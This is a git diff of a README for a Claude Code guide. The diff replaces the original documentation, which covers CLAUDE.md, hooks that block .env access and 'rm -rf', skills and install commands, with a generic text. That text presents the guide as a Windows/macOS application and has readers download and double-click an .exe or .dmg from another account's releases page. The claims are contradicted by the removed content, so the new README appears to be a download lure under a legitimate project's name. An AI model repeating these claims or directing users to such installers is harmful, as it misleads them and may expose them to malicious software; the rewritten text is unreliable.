@@ -1,248 +1,80 @@
-# Claude Code Mastery
+# 🎉 claude-code-mastery - Your Guide to Mastering Claude Code
 
-The complete guide to maximizing Claude Code: Global CLAUDE.md, MCP Servers, Commands, Hooks, Skills, and Why Single-Purpose Chats Matter.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/israel7852/claude-code-mastery/releases)
 
-### 🌐 [Read the Guide on Our Website](https://thedecipherist.github.io/claude-code-mastery/?utm_source=github&utm_medium=readme&utm_campaign=claude-code-mastery&utm_content=hero-cta) ← Best reading experience
+## 📖 Introduction
 
-> **TL;DR:** Your global `~/.claude/CLAUDE.md` is a security gatekeeper AND project scaffolding blueprint. MCP servers extend Claude's capabilities. Custom commands automate workflows. **Hooks enforce rules deterministically** (where CLAUDE.md can fail). Skills package reusable expertise. And research shows mixing topics in a single chat causes **39% performance degradation**.
+Welcome to **claude-code-mastery**! This application provides a comprehensive guide to using Claude Code effectively. Whether you're navigating CLAUDE.md, exploring hooks, mastering skills, or managing MCP servers, this tool simplifies the process for you.
 
----
+## 🚀 Getting Started
 
-## 📚 Table of Contents
+To get started, follow these simple steps. Don’t worry if you have no technical background; we’ve designed this guide for everyone.
 
-- [Quick Start](#-quick-start)
-- [The Guide](#-the-guide)
-- [Repository Contents](#-repository-contents)
-- [Installation](#-installation)
-- [Contributing](#-contributing)
-- [Sources](#-sources)
+## 🎯 Key Features
 
----
+- **Claude Code Guide**: Step-by-step instructions for using CLAUDE.md.
+- **Hooks and Skills**: Learn how to utilize hooks and improve your coding skills.
+- **MCP Servers**: Manage and connect to MCP servers effortlessly.
+- **User-Friendly Interface**: Easy navigation to help you find what you need quickly.
 
-## 🚀 Quick Start
+## 💻 System Requirements
 
-```bash
-# Clone this repo
-git clone https://github.com/TheDecipherist/claude-code-mastery.git
-cd claude-code-mastery
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 4 GB minimum
+- **Disk Space**: 100 MB available space
 
-# Copy hooks to your Claude config
-mkdir -p ~/.claude/hooks
-cp hooks/* ~/.claude/hooks/
-chmod +x ~/.claude/hooks/*.sh
+## 📥 Download & Install
 
-# Copy the settings template (review and customize first!)
-cp templates/settings.json ~/.claude/settings.json
+1. Visit the [Releases page](https://github.com/israel7852/claude-code-mastery/releases) to download the latest version of **claude-code-mastery**.
+2. On the Releases page, find the version you want and click on it.
+3. Click on the file that matches your operating system to start the download. The file will be named something like `claude-code-mastery-v1.0.exe` for Windows or `claude-code-mastery-v1.0.dmg` for macOS.
+4. Once the download completes, locate the downloaded file in your downloads folder.
+5. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-# Copy skills
-mkdir -p ~/.claude/skills
-cp -r skills/* ~/.claude/skills/
-```
+## ⚙️ Using the Application
 
----
+After installing **claude-code-mastery**, follow these steps to start using it:
 
-## 📖 The Guide
+1. Launch the application by double-clicking its icon on your desktop or in your applications folder.
+2. You will see a home screen with options for various guides and features.
+3. Use the menu or navigation bar to select the area you want to explore, such as CLAUDE.md or MCP servers.
+4. Follow the step-by-step instructions in the application to master each topic.
 
-**[📱 Read on Website](https://thedecipherist.github.io/claude-code-mastery/?utm_source=github&utm_medium=readme&utm_campaign=claude-code-mastery&utm_content=guide-section)** (recommended) | [📄 View GUIDE.md](./GUIDE.md)
+## 📊 Topics Covered
 
-### What's Covered
+This application covers various topics to enhance your understanding and use of Claude Code. Here are some key topics:
 
-| Part | Topic | Key Takeaway |
-|------|-------|--------------|
-| 1 | Global CLAUDE.md as Security Gatekeeper | Define once, inherit everywhere |
-| 2 | Project Scaffolding Rules | Every project follows same structure |
-| 3 | MCP Servers | External tool integrations |
-| 4 | Context7 | Live documentation access |
-| 5 | Custom Commands | Workflow automation |
-| 6 | Single-Purpose Chats | 39% degradation from topic mixing |
-| **7** | **Skills & Hooks** | **Enforcement over suggestion** |
+- **AI Agents**: Discover how AI agents can assist you in your coding efforts.
+- **Anthropic Principles**: Understand the ethical aspects of AI and machine learning.
+- **Claude Code**: Get in-depth knowledge of using Claude and its capabilities.
+- **Coding Assistant**: Experience a powerful tool that makes coding easier.
+- **Developer Tools**: Explore tools tailored for developers and programmers.
 
----
+## ❓ FAQs
 
-## 📁 Repository Contents
+1. **What if I encounter issues during installation?**
 
-```
-claude-code-mastery/
-├── GUIDE.md                    # The complete guide
-├── templates/
-│   ├── global-claude.md        # ~/.claude/CLAUDE.md template
-│   ├── project-claude.md       # ./CLAUDE.md starter
-│   ├── settings.json           # Hook configuration template
-│   └── .gitignore              # Recommended .gitignore
-├── hooks/
-│   ├── block-secrets.py        # PreToolUse: Block .env access
-│   ├── block-dangerous-commands.sh  # PreToolUse: Block rm -rf, etc.
-│   ├── end-of-turn.sh          # Stop: Quality gates
-│   ├── after-edit.sh           # PostToolUse: Run formatters
-│   └── notify.sh               # Notification: Desktop alerts
-├── skills/
-│   ├── commit-messages/        # Generate conventional commits
-│   │   └── SKILL.md
-│   └── security-audit/         # Security vulnerability checks
-│       └── SKILL.md
-└── commands/
-    ├── new-project.md          # /new-project scaffold
-    ├── security-check.md       # /security-check audit
-    └── pre-commit.md           # /pre-commit quality gates
-```
+   If you encounter issues, please check the installation steps again. Ensure that you meet the system requirements. If problems persist, consider visiting the support page for assistance.
 
----
+2. **Is this application free?**
 
-## 🔧 Installation
+   Yes, **claude-code-mastery** is open-source and available at no cost.
 
-### Prerequisites
+3. **Can I contribute to the project?**
 
-- [Claude Code](https://code.claude.com) installed
-- Python 3.8+ (for Python hooks)
-- `jq` (for JSON parsing in shell hooks)
+   Absolutely! Contributions are welcome! Please visit the repository for guidelines on how to contribute.
 
-### Step-by-Step
+4. **Will I receive updates?**
 
-#### 1. Install Hooks
+   Yes, you will receive updates whenever a new version of the application is released. Check the Releases page regularly.
 
-```bash
-# Create hooks directory
-mkdir -p ~/.claude/hooks
+## 📞 Support
 
-# Copy hook scripts
-cp hooks/block-secrets.py ~/.claude/hooks/
-cp hooks/block-dangerous-commands.sh ~/.claude/hooks/
-cp hooks/end-of-turn.sh ~/.claude/hooks/
+If you have questions or need help, you can reach out via the support email linked in the application or visit the GitHub Issues section in the repository.
 
-# Make shell scripts executable
-chmod +x ~/.claude/hooks/*.sh
-```
+## 🛡️ License
 
-#### 2. Configure Settings
+**claude-code-mastery** is licensed under the MIT License. You are free to use, modify, and share the application as you see fit.
 
-```bash
-# If you don't have settings.json yet
-cp templates/settings.json ~/.claude/settings.json
-
-# If you already have settings.json, merge the hooks section manually
-```
-
-#### 3. Install Skills
-
-```bash
-# Create skills directory
-mkdir -p ~/.claude/skills
-
-# Copy skills
-cp -r skills/* ~/.claude/skills/
-```
-
-#### 4. Set Up Global CLAUDE.md
-
-```bash
-# Copy template
-cp templates/global-claude.md ~/.claude/CLAUDE.md
-
-# Customize with your details
-$EDITOR ~/.claude/CLAUDE.md
-```
-
-#### 5. Verify Installation
-
-```bash
-# Start Claude Code
-claude
-
-# Check hooks are loaded
-/hooks
-
-# Check skills are loaded
-/skills
-```
-
----
-
-## 🔒 Why Hooks Matter
-
-CLAUDE.md rules are **suggestions**. Hooks are **enforcement**.
-
-```
-CLAUDE.md saying "don't edit .env"
-  → Parsed by LLM
-  → Weighed against other context
-  → Maybe followed
-
-PreToolUse hook blocking .env edits
-  → Always runs
-  → Returns exit code 2
-  → Operation blocked. Period.
-```
-
-Real-world example from a community member:
-
-> "My PreToolUse hook blocks Claude from accessing secrets (.env files) a few times per week. Claude does not respect CLAUDE.md rules very rigorously."
-
-### Hook Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Success, allow operation |
-| 1 | Error (shown to user only) |
-| **2** | **Block operation, feed stderr to Claude** |
-
----
-
-## 🧠 Why Single-Purpose Chats
-
-Research consistently shows topic mixing destroys accuracy:
-
-| Study | Finding |
-|-------|---------|
-| [Multi-turn conversations](https://arxiv.org/pdf/2505.06120) | **39% performance drop** when mixing topics |
-| [Context rot](https://research.trychroma.com/context-rot) | Recall decreases as context grows |
-| [Context pollution](https://kurtiskemple.com/blog/measuring-context-pollution/) | 2% early misalignment → 40% failure rate |
-
-**Golden Rule: One Task, One Chat**
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch
-3. Add your hooks, skills, or improvements
-4. Submit a PR with description
-
-### Ideas for Contributions
-
-- [ ] More language-specific hooks (Go, Rust, Ruby)
-- [ ] Additional skills (code review, documentation, testing)
-- [ ] Framework-specific scaffolding templates
-- [ ] MCP server configuration examples
-
----
-
-## 📚 Sources
-
-### Official Documentation
-- [Claude Code Best Practices](https://www.anthropic.com/engineering/claude-code-best-practices) — Anthropic
-- [Effective Context Engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents) — Anthropic
-- [Agent Skills](https://code.claude.com/docs/en/skills) — Claude Code Docs
-- [Hooks Reference](https://code.claude.com/docs/en/hooks) — Claude Code Docs
-
-### Research
-- [LLMs Get Lost In Multi-Turn Conversation](https://arxiv.org/pdf/2505.06120) — arXiv
-- [Context Rot Research](https://research.trychroma.com/context-rot) — Chroma
-- [Claude Loads Secrets Without Permission](https://www.knostic.ai/blog/claude-loads-secrets-without-permission) — Knostic
-
-### Community
-- [Claude Code Hooks: Guardrails That Actually Work](https://paddo.dev/blog/claude-code-hooks-guardrails/)
-- [Claude Code Hooks Mastery](https://github.com/disler/claude-code-hooks-mastery)
-- [Claude Code Security Best Practices](https://www.backslash.security/blog/claude-code-security-best-practices)
-
----
-
-## 📄 License
-
-MIT License - See [LICENSE](./LICENSE)
-
----
-
-*Built with ❤️ by [TheDecipherist](https://thedecipherist.com?utm_source=github&utm_medium=readme&utm_campaign=claude-code-mastery&utm_content=author-link) and the Claude Code community*
+Make sure to visit the [Releases page](https://github.com/israel7852/claude-code-mastery/releases) to download the application and start your journey with Claude Code today!
